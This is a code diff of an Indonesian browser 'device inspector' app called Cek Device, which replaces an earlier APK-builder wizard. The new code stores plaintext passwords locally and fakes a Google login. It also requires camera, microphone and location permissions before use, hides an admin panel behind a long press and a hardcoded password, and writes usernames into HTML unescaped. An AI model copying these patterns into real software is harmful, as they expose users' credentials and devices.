+      <div class="row"><span class="row-label">Downlink Max</span><span class="row-value" id="net2-down">--</span></div>
+      <div class="row"><span class="row-label">RTT</span><span class="row-value" id="net2-rtt">--</span></div>
+      <div class="row"><span class="row-label">Hemat Data</span><span class="row-value" id="net2-save">--</span></div>
+    </div>
+    <div class="section-label">Info Lokasi IP</div>
+    <div class="card">
+      <div class="row"><span class="row-label">IP Publik</span><span class="row-value" id="ip-addr">Memuat...</span></div>
+      <div class="row"><span class="row-label">Kota</span><span class="row-value" id="ip-city">--</span></div>
+      <div class="row"><span class="row-label">Negara</span><span class="row-value" id="ip-country">--</span></div>
+      <div class="row"><span class="row-label">ISP</span><span class="row-value" id="ip-isp">--</span></div>
+      <div class="row"><span class="row-label">Timezone</span><span class="row-value" id="ip-tz">--</span></div>
+    </div>
+    <div class="section-label">Latensi</div>
+    <div class="card">
+      <div class="row"><span class="row-label">DNS Lookup</span><span class="row-value" id="lat-dns">--</span></div>
+      <div class="row"><span class="row-label">Ping Estimasi</span><span class="row-value" id="lat-ping">--</span></div>
+    </div>
+  </div>
+
+  <!-- SENSORS TAB -->
+  <div class="content" id="tab-sensors">
+    <div class="section-label">Sensor Gerak</div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot active"></span>Accelerometer</div><div class="sensor-value" id="sen-accel">X: -- &nbsp; Y: -- &nbsp; Z: --</div></div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot active"></span>Gyroscope</div><div class="sensor-value" id="sen-gyro">X: -- &nbsp; Y: -- &nbsp; Z: --</div></div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot"></span>Magnetometer</div><div class="sensor-value" id="sen-mag">--</div></div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot"></span>Orientasi Absolut</div><div class="sensor-value" id="sen-orient">Alpha: -- &nbsp; Beta: -- &nbsp; Gamma: --</div></div>
+    <div class="section-label">Sensor Lingkungan</div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot" id="dot-light"></span>Cahaya Sekitar</div><div class="sensor-value" id="sen-light">-- lux</div></div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot" id="dot-prox"></span>Proximity</div><div class="sensor-value" id="sen-prox">--</div></div>
+    <div class="section-label">Langkah Kaki</div>
+    <div class="sensor-card"><div class="sensor-name"><span class="sensor-dot" id="dot-step"></span>Step Counter</div><div class="sensor-value" id="sen-step">-- langkah</div></div>
+    <div class="scroll-hint">* Sensor memerlukan izin pengguna di beberapa browser</div>
+  </div>
+
+  <!-- LOKASI TAB -->
+  <div class="content" id="tab-lokasi">
+    <button class="loc-btn" id="locBtn" onclick="detectLokasi()">DAPATKAN LOKASI SAYA</button>
+    <div class="section-label">Koordinat GPS</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Status</span><span class="row-value highlight" id="loc-status">Belum diminta</span></div>
+      <div class="row"><span class="row-label">Latitude</span><span class="row-value" id="loc-lat">--</span></div>
+      <div class="row"><span class="row-label">Longitude</span><span class="row-value" id="loc-lon">--</span></div>
+      <div class="row"><span class="row-label">Akurasi</span><span class="row-value" id="loc-acc">--</span></div>
+      <div class="row"><span class="row-label">Altitude</span><span class="row-value" id="loc-alt">--</span></div>
+    </div>
+    <div class="section-label">Alamat</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Jalan</span><span class="row-value" id="loc-road">--</span></div>
+      <div class="row"><span class="row-label">Kelurahan</span><span class="row-value" id="loc-suburb">--</span></div>
+      <div class="row"><span class="row-label">Kota</span><span class="row-value" id="loc-city">--</span></div>
+      <div class="row"><span class="row-label">Provinsi</span><span class="row-value" id="loc-state">--</span></div>
+      <div class="row"><span class="row-label">Negara</span><span class="row-value" id="loc-country">--</span></div>
+      <div class="row"><span class="row-label">Kode Pos</span><span class="row-value" id="loc-postcode">--</span></div>
+    </div>
+    <a class="loc-maps-link" id="loc-maps-link" href="#" target="_blank" style="display:none">BUKA DI GOOGLE MAPS</a>
+    <div class="scroll-hint">* Memerlukan izin lokasi dari browser</div>
+  </div>
+
+  <!-- ABOUT TAB -->
+  <div class="content" id="tab-about">
+    <div class="about-wrap">
+      <div class="about-logo">CEK DEVICE</div>
+      <div class="about-tagline">System Inspector v1.1</div>
+      <div class="about-divider"></div>
+      <div class="card">
+        <div class="row"><span class="row-label">Versi Aplikasi</span><span class="row-value">1.1.0</span></div>
+        <div class="row"><span class="row-label">Build</span><span class="row-value">2025.04.17</span></div>
+        <div class="row"><span class="row-label">Platform</span><span class="row-value">Web App (PWA/APK-Ready)</span></div>
+      </div>
+      <div class="about-divider"></div>
+      <div class="section-label">Deskripsi</div>
+      <div class="card">
+        <div style="padding:14px;font-size:12px;color:var(--text-secondary);line-height:1.7">
+          Cek Device menampilkan informasi teknis lengkap tentang perangkat Anda. Mendukung login, sign up, dan Google login. Sesi tersimpan otomatis sehingga tidak perlu login ulang.
+        </div>
+      </div>
+      <div class="about-divider"></div>
+      <div class="section-label">Privasi</div>
+      <div class="card">
+        <div style="padding:14px;font-size:12px;color:var(--text-secondary);line-height:1.7">
+          Semua data hanya diproses secara lokal di perangkat Anda. Tidak ada informasi yang dikirim ke server manapun. IP publik dan info lokasi diambil dari layanan ipapi.co.
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end main-app -->
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav" id="bottom-nav">
+  <button class="nav-btn" onclick="navBack()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+    <span>Back</span>
+  </button>
+  <div class="nav-divider"></div>
+  <button class="nav-btn" onclick="navHome()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12L12 3l9 9"/><path d="M9 21V12h6v9"/></svg>
+    <span>Home</span>
+  </button>
 </div>
+
+<audio id="bgm" src="https://files.catbox.moe/z7hcu9.mp3" loop></audio>
 
 <script>
-(function(){
-  const a=document.getElementById('bgMusic');
-  a.volume=0.72;
-  function p(){a.play().catch(()=>{});}
-  p();
-  document.addEventListener('click',p);
-  document.addEventListener('touchstart',p);
-})();
+// ===== NAVIGATION HISTORY =====
+let navHistory = [];
+let viewingUser = null;
 
-let currentStep=0,sourceType='url',iconBlob=null,iconOriginalSrc=null,iconShape='rounded',splashBgColor='#0a0a0a';
-let cropStartX,cropStartY,cropEndX,cropEndY,isCropping=false,cropImg=null,cropRect=null;
-const stepTitles=['Informasi Aplikasi','Sumber Konten','Icon Aplikasi','Splash Screen','GitHub & Build'];
-const stepNums=['01','02','03','04','05'];
+function pushNav(state) { navHistory.push(state); }
+function popNav() { return navHistory.pop(); }
 
-function goStep(n){
-  document.getElementById('step'+currentStep).classList.remove('active');
-  document.querySelectorAll('.step-dot').forEach((d,i)=>{
-    d.classList.remove('active','done');
-    if(i<n)d.classList.add('done');
-    else if(i===n)d.classList.add('active');
-  });
-  currentStep=n;
-  document.getElementById('step'+n).classList.add('active');
-  document.getElementById('stepNumEl').textContent=stepNums[n];
-  document.getElementById('stepTitleEl').textContent=stepTitles[n];
-  updateRepoName();
-  window.scrollTo({top:0,behavior:'smooth'});
-}
-function nextStep(f){if(validateStep(f))goStep(f+1);}
-function prevStep(f){goStep(f-1);}
-
-function showErr(id,msg){
-  const el=document.getElementById('err'+id);
-  el.textContent=msg; el.classList.add('show');
-  setTimeout(()=>el.classList.remove('show'),5000);
+// ===== AUTH =====
+function authSwitch(tab) {
+  document.getElementById('form-login').style.display = tab==='login'?'flex':'none';
+  document.getElementById('form-signup').style.display = tab==='signup'?'flex':'none';
+  document.getElementById('tab-login-btn').classList.toggle('active', tab==='login');
+  document.getElementById('tab-signup-btn').classList.toggle('active', tab==='signup');
 }
 
-function validateStep(s){
-  if(s===0){
-    const n=document.getElementById('appName').value.trim();
-    const p=document.getElementById('packageName').value.trim();
-    if(!n){showErr(0,'Nama aplikasi wajib diisi.');return false;}
-    if(!p||!/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/.test(p)){showErr(0,'Package name tidak valid. Contoh: com.nama.app');return false;}
-    return true;
+function doSignup() {
+  const u=document.getElementById('signup-user').value.trim();
+  const p=document.getElementById('signup-pass').value;
+  const p2=document.getElementById('signup-pass2').value;
+  const err=document.getElementById('signup-err');
+  if(!u){err.textContent='Username tidak boleh kosong';return;}
+  if(p.length<4){err.textContent='Password minimal 4 karakter';return;}
+  if(p!==p2){err.textContent='Password tidak cocok';return;}
+  const users=JSON.parse(localStorage.getItem('cd_users')||'{}');
+  if(users[u]){err.textContent='Username sudah dipakai';return;}
+
+  // Simpan data user beserta info perangkat saat signup
+  users[u] = { password: p, deviceInfo: captureDeviceInfo(), joinDate: new Date().toISOString(), loginMethod: 'manual' };
+  localStorage.setItem('cd_users', JSON.stringify(users));
+  err.textContent='';
+  localStorage.setItem('cd_session', u);
+  afterLogin(u);
+}
+
+function doLogin() {
+  const u=document.getElementById('login-user').value.trim();
+  const p=document.getElementById('login-pass').value;
+  const err=document.getElementById('login-err');
+  const users=JSON.parse(localStorage.getItem('cd_users')||'{}');
+
+  // Support old format (plain string) and new format (object)
+  const userData = users[u];
+  const storedPass = typeof userData === 'object' ? userData.password : userData;
+  if(!userData || storedPass!==p){err.textContent='Username atau password salah';return;}
+
+  // Update device info on login
+  if(typeof userData === 'object') {
+    userData.deviceInfo = captureDeviceInfo();
+    userData.lastLogin = new Date().toISOString();
+    localStorage.setItem('cd_users', JSON.stringify(users));
   }
-  if(s===1){
-    if(sourceType==='url'){
-      const u=document.getElementById('webviewUrl').value.trim();
-      if(!u||!/^https?:\/\/.+/.test(u)){showErr(1,'URL tidak valid.');return false;}
-    } else {
-      if(!document.getElementById('htmlFile').files.length){showErr(1,'Pilih file HTML.');return false;}
-    }
-    return true;
-  }
-  if(s===2){
-    if(!iconBlob){showErr(2,'Pilih icon aplikasi terlebih dahulu.');return false;}
-    return true;
-  }
-  return true;
+
+  err.textContent='';
+  localStorage.setItem('cd_session', u);
+  afterLogin(u);
 }
 
-function setSource(t){
-  sourceType=t;
-  document.getElementById('srcUrl').classList.toggle('active',t==='url');
-  document.getElementById('srcHtml').classList.toggle('active',t==='html');
-  document.getElementById('urlField').style.display=t==='url'?'block':'none';
-  document.getElementById('htmlField').style.display=t==='html'?'block':'none';
+function doGoogleLogin() {
+  // Simulate Google login - in real APK this would use Google Sign-In SDK
+  const mockName = 'User_' + Math.random().toString(36).substr(2,6);
+  const users = JSON.parse(localStorage.getItem('cd_users')||'{}');
+  if (!users[mockName]) {
+    users[mockName] = { password: null, deviceInfo: captureDeviceInfo(), joinDate: new Date().toISOString(), loginMethod: 'google' };
+    localStorage.setItem('cd_users', JSON.stringify(users));
+  }
+  localStorage.setItem('cd_session', mockName);
+
+  // Show info
+  const err = document.getElementById('login-err') || document.getElementById('signup-err');
+  if(err) { err.style.color='#888'; err.textContent='Login Google berhasil sebagai '+mockName; }
+  setTimeout(()=>afterLogin(mockName), 800);
 }
-function handleHtmlFile(i){
-  if(i.files.length){const f=document.getElementById('htmlFilename');f.textContent=i.files[0].name;f.style.display='block';}
-}
-function handleIconFile(input){
-  if(!input.files.length)return;
-  const r=new FileReader();
-  r.onload=function(e){
-    iconOriginalSrc=e.target.result; iconBlob=e.target.result;
-    const img=document.getElementById('iconImg');
-    img.src=e.target.result; img.style.display='block'; img.style.transform='scale(1)';
-    document.getElementById('iconPlaceholder').style.display='none';
-    document.getElementById('iconZoom').value=100; document.getElementById('zoomVal').textContent='100%';
+
+function captureDeviceInfo() {
+  const ua = navigator.userAgent;
+  let brand='Perangkat', model='--';
+  if(/SM-(\w+)/i.test(ua)){brand='Samsung';model='Galaxy '+ua.match(/SM-(\w+)/i)[1];}
+  else if(/Pixel (\d+\w*)/i.test(ua)){brand='Google';model='Pixel '+ua.match(/Pixel (\d+\w*)/i)[1];}
+  else if(/Redmi (\w+)/i.test(ua)){brand='Xiaomi';model='Redmi '+ua.match(/Redmi (\w+)/i)[1];}
+  else if(/POCO (\w+)/i.test(ua)){brand='POCO';model=ua.match(/POCO (\w+)/i)[0];}
+  else if(/iPhone/i.test(ua)){brand='Apple';model='iPhone';}
+  else if(/iPad/i.test(ua)){brand='Apple';model='iPad';}
+  else if(/android/i.test(ua)){const av=ua.match(/Android ([\d.]+)/i);brand='Android';model='Android '+(av?av[1]:'');}
+  else{brand='Desktop';model=navigator.platform||'PC';}
+
+  let os='--';
+  if(/android/i.test(ua)){const av=ua.match(/Android ([\d.]+)/i);os='Android '+(av?av[1]:'');}
+  else if(/iphone|ipad/i.test(ua)){os='iOS/iPadOS';}
+  else if(/windows/i.test(ua)){os='Windows';}
+  else if(/mac/i.test(ua)){os='macOS';}
+  else if(/linux/i.test(ua)){os='Linux';}
+
+  return {
+    brand, model, os,
+    screen: screen.width+'x'+screen.height,
+    cores: navigator.hardwareConcurrency||'--',
+    ram: navigator.deviceMemory ? navigator.deviceMemory+'GB' : '--',
+    ua: ua.substring(0,80)
   };
-  r.readAsDataURL(input.files[0]);
-}
-function setShape(shape,evt){
-  iconShape=shape;
-  document.querySelectorAll('.shape-btn').forEach(b=>b.classList.remove('active'));
-  if(evt&&evt.currentTarget)evt.currentTarget.classList.add('active');
-  document.getElementById('iconPreview').className='icon-preview shape-'+shape;
-}
-function applyZoom(v){document.getElementById('zoomVal').textContent=v+'%';document.getElementById('iconImg').style.transform='scale('+(v/100)+')';}
-
-function openCrop(){if(!iconOriginalSrc){showErr(2,'Upload icon dulu.');return;}document.getElementById('cropModal').classList.add('show');initCropCanvas();}
-function closeCrop(){document.getElementById('cropModal').classList.remove('show');}
-function initCropCanvas(){
-  const canvas=document.getElementById('cropCanvas');
-  const container=document.getElementById('cropContainer');
-  const cw=container.clientWidth,ch=container.clientHeight;
-  canvas.width=cw;canvas.height=ch;
-  const ctx=canvas.getContext('2d');
-  const img=new Image();
-  img.onload=function(){
-    cropImg=img;
-    const sc=Math.min(cw/img.width,ch/img.height);
-    const dw=img.width*sc,dh=img.height*sc;
-    const ox=(cw-dw)/2,oy=(ch-dh)/2;
-    ctx.clearRect(0,0,cw,ch);ctx.drawImage(img,ox,oy,dw,dh);
-    canvas._b={ox,oy,dw,dh,imgW:img.width,imgH:img.height};
-  };
-  img.src=iconOriginalSrc;
-  cropRect=null;updateCropOverlay();
-  canvas.onmousedown=canvas.ontouchstart=startCropDrag;
-  canvas.onmousemove=canvas.ontouchmove=moveCropDrag;
-  canvas.onmouseup=canvas.ontouchend=endCropDrag;
-}
-function getPos(e,el){const r=el.getBoundingClientRect(),s=e.touches?e.touches[0]:e;return{x:s.clientX-r.left,y:s.clientY-r.top};}
-function startCropDrag(e){e.preventDefault();isCropping=true;const p=getPos(e,this);cropStartX=p.x;cropStartY=p.y;cropEndX=p.x;cropEndY=p.y;}
-function moveCropDrag(e){e.preventDefault();if(!isCropping)return;const p=getPos(e,this);cropEndX=p.x;cropEndY=p.y;updateCropOverlay();}
-function endCropDrag(e){if(!isCropping)return;isCropping=false;const p=getPos(e,this);cropEndX=p.x;cropEndY=p.y;cropRect={x:Math.min(cropStartX,cropEndX),y:Math.min(cropStartY,cropEndY),w:Math.abs(cropEndX-cropStartX),h:Math.abs(cropEndY-cropStartY)};updateCropOverlay();}
-function updateCropOverlay(){
-  const svg=document.getElementById('cropSvg'),canvas=document.getElementById('cropCanvas');
-  svg.setAttribute('width',canvas.width);svg.setAttribute('height',canvas.height);
-  if(!isCropping&&!cropRect){svg.innerHTML='';return;}
-  const rx=Math.min(cropStartX,cropEndX),ry=Math.min(cropStartY,cropEndY),rw=Math.abs(cropEndX-cropStartX),rh=Math.abs(cropEndY-cropStartY);
-  svg.innerHTML=`<rect x="0" y="0" width="${canvas.width}" height="${canvas.height}" fill="rgba(0,0,0,0.5)"/><rect x="${rx}" y="${ry}" width="${rw}" height="${rh}" fill="none" stroke="#f0f0f0" stroke-width="1.5" stroke-dasharray="4 3"/><rect x="${rx}" y="${ry}" width="${rw}" height="${rh}" fill="rgba(240,240,240,0.05)"/>`;
-}
-function applyCrop(){
-  if(!cropRect||cropRect.w<10||cropRect.h<10){closeCrop();return;}
-  const canvas=document.getElementById('cropCanvas'),b=canvas._b;
-  if(!b){closeCrop();return;}
-  const sx=b.imgW/b.dw,sy=b.imgH/b.dh;
-  const ix=(cropRect.x-b.ox)*sx,iy=(cropRect.y-b.oy)*sy,iw=cropRect.w*sx,ih=cropRect.h*sy;
-  const out=document.createElement('canvas');out.width=512;out.height=512;
-  out.getContext('2d').drawImage(cropImg,ix,iy,iw,ih,0,0,512,512);
-  const res=out.toDataURL('image/png');iconOriginalSrc=res;iconBlob=res;
-  const img=document.getElementById('iconImg');img.src=res;img.style.display='block';
-  document.getElementById('iconPlaceholder').style.display='none';closeCrop();
 }
 
-function pickSwatch(el){
-  document.querySelectorAll('.color-swatch').forEach(s=>s.classList.remove('selected'));
-  el.classList.add('selected');
-  const c=el.getAttribute('data-color');splashBgColor=c;
-  document.getElementById('splashColor').value=c;
-  document.getElementById('splashColorHex').textContent=c;
-  document.getElementById('splashPreview').style.background=c;
-}
-function updateSplashColor(c){
-  splashBgColor=c;document.getElementById('splashColorHex').textContent=c;
-  document.getElementById('splashPreview').style.background=c;
-  document.querySelectorAll('.color-swatch').forEach(s=>s.classList.remove('selected'));
+function afterLogin(u) {
+  const permsDone=localStorage.getItem('cd_perms_done_'+u);
+  showScreen('none');
+  if(permsDone) showScreen('play');
+  else showScreen('perm');
 }
 
-function updateRepoName(){
-  const n=document.getElementById('appName').value.trim();
-  const slug=n?n.toLowerCase().replace(/[^a-z0-9]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,''):'';
-  const rn=slug?'apk-'+slug:'-- isi nama app dulu --';
-  document.getElementById('repoAutoName').textContent=rn;
-  return slug?'apk-'+slug:null;
-}
-document.getElementById('appName').addEventListener('input',updateRepoName);
-
-function startBuild(){
-  const u=document.getElementById('githubUser').value.trim();
-  const t=document.getElementById('githubToken').value.trim();
-  if(!u){showErr(4,'GitHub username wajib diisi.');return;}
-  if(!t||(!t.startsWith('ghp_')&&!t.startsWith('github_pat_'))){showErr(4,'Token tidak valid. Harus diawali ghp_ atau github_pat_');return;}
-  const rn=updateRepoName();
-  if(!rn){showErr(4,'Isi nama aplikasi di step 1 dulu.');return;}
-  document.getElementById('progressOverlay').classList.add('show');
-  runBuild(u,t,rn);
+function showScreen(name) {
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  if(name==='none') return;
+  const el=document.getElementById('screen-'+name);
+  if(el) el.classList.add('active');
 }
 
-function addLog(msg,type=''){
-  const log=document.getElementById('progressLog');
-  const line=document.createElement('div');
-  line.className='log-line'+(type?' '+type:'');
-  line.textContent=msg;log.appendChild(line);log.scrollTop=log.scrollHeight;
-}
-function setProgress(p,t){
-  document.getElementById('progressBar').style.width=p+'%';
-  document.getElementById('progressStepText').textContent=t;
-}
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+// ===== PERMISSIONS =====
+const permState={geo:false,notif:false,cam:false,mic:false};
 
-async function pushFile(token,owner,repo,path,content,msg){
-  let sha=null;
+function grantPerm(type) {
+  document.getElementById('perm-'+type+'-btn').disabled=true;
+  document.getElementById('perm-'+type+'-status').textContent='Meminta...';
+  if(type==='geo'){
+    navigator.geolocation.getCurrentPosition(()=>markPerm('geo',true),()=>markPerm('geo',false));
+  } else if(type==='notif'){
+    Notification.requestPermission().then(r=>markPerm('notif',r==='granted'));
+  } else if(type==='cam'){
+    navigator.mediaDevices.getUserMedia({video:true})
+      .then(s=>{s.getTracks().forEach(t=>t.stop());markPerm('cam',true);})
+      .catch(()=>markPerm('cam',false));
+  } else if(type==='mic'){
+    navigator.mediaDevices.getUserMedia({audio:true})
+      .then(s=>{s.getTracks().forEach(t=>t.stop());markPerm('mic',true);})
+      .catch(()=>markPerm('mic',false));
+  }
+}
+
+function markPerm(type,ok) {
+  permState[type]=true;
+  const st=document.getElementById('perm-'+type+'-status');
+  st.textContent=ok?'Diizinkan':'Ditolak';
+  st.className='perm-status '+(ok?'granted':'denied');
+  checkAllPerms();
+}
+
+function checkAllPerms() {
+  if(permState.geo&&permState.notif&&permState.cam&&permState.mic){
+    const u=localStorage.getItem('cd_session');
+    localStorage.setItem('cd_perms_done_'+u,'1');
+    document.getElementById('play-btn').classList.add('visible');
+  }
+}
+
+// ===== GOTO MAIN =====
+function goToMain(fromUser) {
+  viewingUser = fromUser;
+  showScreen('none');
+  document.getElementById('main-app').style.display='block';
+  document.getElementById('bottom-nav').classList.add('show');
+
+  if(fromUser) {
+    document.getElementById('user-info-bar').classList.add('show');
+    document.getElementById('viewing-user-name').textContent = fromUser;
+    document.getElementById('header-subtitle').textContent = 'Melihat perangkat: '+fromUser;
+  } else {
+    document.getElementById('user-info-bar').classList.remove('show');
+    const session = localStorage.getItem('cd_session');
+    document.getElementById('header-subtitle').textContent = session ? 'Masuk sebagai: '+session : 'System Inspector';
+  }
+
+  pushNav({type:'main'});
+  startBGM();
+  setTimeout(runScan,400);
+}
+
+// ===== BOTTOM NAV =====
+function navHome() {
+  // Kembali ke halaman utama (perangkat sendiri)
+  const session = localStorage.getItem('cd_session');
+  if(viewingUser) {
+    viewingUser = null;
+    document.getElementById('user-info-bar').classList.remove('show');
+    document.getElementById('header-subtitle').textContent = session ? 'Masuk sebagai: '+session : 'System Inspector';
+    // Switch to first tab
+    document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+    document.getElementById('tab-soc').classList.add('active');
+    document.querySelectorAll('.tab')[0].classList.add('active');
+    runScan();
+  } else {
+    // Sudah di halaman sendiri, scroll ke atas
+    window.scrollTo({top:0,behavior:'smooth'});
+  }
+}
+
+function navBack() {
+  if(viewingUser) {
+    // Kembali ke admin panel user list
+    document.getElementById('main-app').style.display='none';
+    document.getElementById('bottom-nav').classList.remove('show');
+    viewingUser = null;
+    openAdminPanel();
+  } else {
+    // Tidak ada history, tidak melakukan apa-apa (atau bisa logout)
+    // pada APK, ini akan menutup app
+  }
+}
+
+// ===== MUSIC =====
+const bgm=document.getElementById('bgm');
+bgm.volume=0.75;
+function startBGM() {
+  bgm.volume=0.75;
+  document.getElementById('vol-bar').classList.add('show');
+  bgm.play().catch(()=>document.addEventListener('click',()=>bgm.play(),{once:true}));
+}
+function setVol(v) { bgm.volume=parseFloat(v); }
+
+// ===== LONG PRESS 5 DETIK =====
+let lpRaf=null, lpStart=0;
+const LP_DURATION=5000;
+const lpWrap=document.getElementById('lp-wrap');
+const lpBar=document.getElementById('lp-bar');
+
+function lpBegin(e) {
+  e.preventDefault();
+  lpStart=Date.now();
+  lpBar.style.transition='none';
+  lpBar.style.width='0%';
+  function tick() {
+    const elapsed=Date.now()-lpStart;
+    const pct=Math.min((elapsed/LP_DURATION)*100,100);
+    lpBar.style.width=pct+'%';
+    if(pct<100) lpRaf=requestAnimationFrame(tick);
+    else lpTriggered();
+  }
+  lpRaf=requestAnimationFrame(tick);
+}
+
+function lpCancel() {
+  if(lpRaf) cancelAnimationFrame(lpRaf);
+  lpRaf=null; lpStart=0;
+  lpBar.style.transition='width 0.2s ease';
+  lpBar.style.width='0%';
+}
+
+function lpTriggered() {
+  lpCancel();
+  openPwModal();
+}
+
+lpWrap.addEventListener('mousedown',lpBegin);
+lpWrap.addEventListener('touchstart',lpBegin,{passive:false});
+lpWrap.addEventListener('mouseup',lpCancel);
+lpWrap.addEventListener('mouseleave',lpCancel);
+lpWrap.addEventListener('touchend',lpCancel);
+lpWrap.addEventListener('touchcancel',lpCancel);
+
+// ===== PASSWORD MODAL =====
+function openPwModal() {
+  document.getElementById('pw-modal').classList.add('active');
+  document.getElementById('pw-input').value='';
+  document.getElementById('pw-err').textContent='';
+  setTimeout(()=>document.getElementById('pw-input').focus(),100);
+}
+function closePwModal() { document.getElementById('pw-modal').classList.remove('active'); }
+function checkPw() {
+  if(document.getElementById('pw-input').value==='nazam123321A') {
+    closePwModal();
+    openAdminPanel();
+  } else {
+    document.getElementById('pw-err').textContent='Password salah';
+  }
+}
+
+// ===== ADMIN PANEL =====
+function openAdminPanel() {
+  const users = JSON.parse(localStorage.getItem('cd_users')||'{}');
+  const list = document.getElementById('admin-user-list');
+  const empty = document.getElementById('admin-empty');
+  list.innerHTML = '';
+
+  const userKeys = Object.keys(users);
+  if(userKeys.length === 0) {
+    empty.style.display='block';
+  } else {
+    empty.style.display='none';
+    userKeys.forEach(username => {
+      const userData = users[username];
+      const info = typeof userData === 'object' ? userData.deviceInfo : null;
+      const joinDate = typeof userData === 'object' && userData.joinDate ? new Date(userData.joinDate).toLocaleDateString('id-ID') : '--';
+      const loginMethod = typeof userData === 'object' ? (userData.loginMethod||'manual') : 'manual';
+
+      const brand = info ? info.brand : '--';
+      const model = info ? info.model : '--';
+      const os = info ? info.os : '--';
+
+      const card = document.createElement('div');
+      card.className = 'user-card';
+      card.innerHTML = `
+        <div class="user-avatar">${username.charAt(0)}</div>
+        <div class="user-info">
+          <div class="user-name">${username}</div>
+          <div class="user-meta">${brand} ${model} · ${os}</div>
+          <div class="user-meta" style="font-size:10px;color:var(--text-muted);margin-top:2px;">Daftar: ${joinDate} · ${loginMethod==='google'?'Google':'Manual'}</div>
+        </div>
+        <div class="user-device-badge">${brand}</div>
+        <div class="user-arrow">›</div>
+      `;
+      card.onclick = () => viewUserDevice(username);
+      list.appendChild(card);
+    });
+  }
+
+  document.getElementById('main-app').style.display='none';
+  document.getElementById('bottom-nav').classList.remove('show');
+  showScreen('admin');
+}
+
+function viewUserDevice(username) {
+  showScreen('none');
+  goToMain(username);
+  // Load data perangkat user tersebut ke UI
+  const users = JSON.parse(localStorage.getItem('cd_users')||'{}');
+  const userData = users[username];
+  const info = typeof userData === 'object' ? userData.deviceInfo : null;
+  if(info) {
+    setTimeout(() => {
+      setVal('dev-brand', info.brand||'--');
+      setVal('dev-model', info.model||'--');
+      setVal('dev-ua-short', info.ua ? info.ua.substring(0,60)+'...' : '--');
+      setVal('sys-os', info.os||'--');
+      setVal('cpu-cores', info.cores ? info.cores+' core' : '--');
+      setVal('cpu-threads', info.cores ? info.cores+' thread' : '--');
+      setVal('ram-total', info.ram||'--');
+      setVal('scr-res', info.screen||'--');
+    }, 500);
+  }
+}
+
+function closeAdmin() {
+  showScreen('none');
+  document.getElementById('main-app').style.display='block';
+  document.getElementById('bottom-nav').classList.add('show');
+}
+
+// ===== INIT =====
+window.addEventListener('load',()=>{
+  const session=localStorage.getItem('cd_session');
+  if(session){
+    const users=JSON.parse(localStorage.getItem('cd_users')||'{}');
+    if(users[session]){afterLogin(session);return;}
+  }
+  showScreen('auth');
+});
+
+// ===== CLOCK =====
+function updateClock(){
+  const now=new Date(), el=document.getElementById('clock');
+  if(el) el.textContent=String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0');
+}
+updateClock(); setInterval(updateClock,5000);
+
+// ===== TABS =====
+function switchTab(name,el){
+  document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  el.classList.add('active');
+}
+
+function setVal(id,val){const e=document.getElementById(id);if(e)e.textContent=val;}
+
+// ===== DETECT =====
+function detectSOC(){
+  const ua=navigator.userAgent;
+  let socName='Tidak Terdeteksi',cpuVendor='Tidak Diketahui';
+  if(/android/i.test(ua)){
+    if(/SM-|samsung/i.test(ua)){cpuVendor='Samsung / ARM';socName='Exynos / Snapdragon';}
+    else if(/Pixel/i.test(ua)){cpuVendor='Google / ARM';socName='Google Tensor';}
+    else if(/CPH|OPPO|Reno|Find/i.test(ua)){cpuVendor='MediaTek / Qualcomm';socName='MediaTek / Snapdragon';}
+    else if(/Redmi|POCO|Mi /i.test(ua)){cpuVendor='Qualcomm';socName='Snapdragon Series';}
+    else if(/vivo/i.test(ua)){cpuVendor='MediaTek / Qualcomm';socName='MediaTek / Snapdragon';}
+    else if(/HUAWEI|HW/i.test(ua)){cpuVendor='HiSilicon';socName='Kirin Series';}
+    else{cpuVendor='ARM';socName='ARM Processor';}
+  } else if(/iPhone|iPad/i.test(ua)){cpuVendor='Apple';socName='Apple Silicon (A/M Series)';}
+  else{cpuVendor='x86 / x64';socName='Desktop / Laptop CPU';}
+  const cores=navigator.hardwareConcurrency||'--';
+  document.getElementById('soc-name').textContent=socName;
+  document.getElementById('soc-freq').textContent=cores+' Core Terdeteksi';
+  setVal('cpu-vendor',cpuVendor);
+  setVal('cpu-arch',/arm|aarch/i.test(navigator.platform||'')?'ARM64 (aarch64)':navigator.platform||'arm64');
+  setVal('cpu-cores',cores+' core'); setVal('cpu-threads',cores+' thread');
+  setVal('cpu-platform',/android/i.test(ua)?'Android':/iPhone|iPad/i.test(ua)?'iOS / iPadOS':'Desktop');
   try{
-    const c=await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`,{headers:{'Authorization':'token '+token,'Accept':'application/vnd.github.v3+json'}});
-    if(c.ok){const d=await c.json();sha=d.sha;}
+    const canvas=document.createElement('canvas');
+    const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+    if(gl){
+      const ext=gl.getExtension('WEBGL_debug_renderer_info');
+      if(ext){setVal('gpu-vendor',gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)||'--');setVal('gpu-renderer',gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||'--');}
+      else{setVal('gpu-vendor','ARM / Qualcomm');setVal('gpu-renderer','Tidak dapat dibaca');}
